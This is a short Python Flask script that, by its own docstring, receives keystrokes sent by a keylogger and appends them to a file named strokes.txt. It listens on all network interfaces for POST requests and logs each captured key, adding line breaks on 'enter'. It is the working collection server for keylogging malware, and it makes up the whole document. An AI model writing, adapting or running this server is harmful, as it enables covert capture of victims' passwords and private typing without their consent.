
'''
Gets data from keylogger and appends it to a text file named strokes.txt
'''


from flask import Flask, request

app = Flask(__name__)

@app.route('/data', methods=['POST'])
def receive_data():
    # Parse JSON or form data from the POST request
    if request.is_json:
        data = request.get_json()
    else:
        data = request.form.to_dict()
    #print("Received data:", data)
    
    #  writting dtaat to file
    with open('strokes.txt', 'a') as f:
        f.write(data['message']+' ')
        if(data['message']=='enter'):
            f.write('\n')

    return 'OK', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)


